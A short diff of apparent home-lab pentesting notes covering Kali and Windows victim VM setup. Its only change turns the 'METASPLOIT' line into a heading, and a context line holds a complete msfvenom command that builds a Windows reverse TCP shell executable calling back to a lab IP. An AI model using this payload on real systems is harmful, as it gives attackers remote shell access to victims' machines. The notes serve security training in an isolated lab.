@@ -15,7 +15,7 @@ Victim - Another virtual machine (in this case using Windows)
         - Setting up Kali Linux (on VMWare, an alternative is on Oracle VM): https://www.youtube.com/watch?v=pwYH0NNWWzU
         - Setting up victim machine: https://www.youtube.com/watch?v=nvdnQX9UkMY&t=259s
 
-METASPLOIT:
+# METASPLOIT:
     How to create a payload?
         - If you are creating a payload for testing directly from terminal
           run command 'msfvenom -p windows/shell/reverse_tcp LHOST=192.168.110.129 LPORT=4444 -f exe > ~/Desktop/ShellCodes/payload.exe'
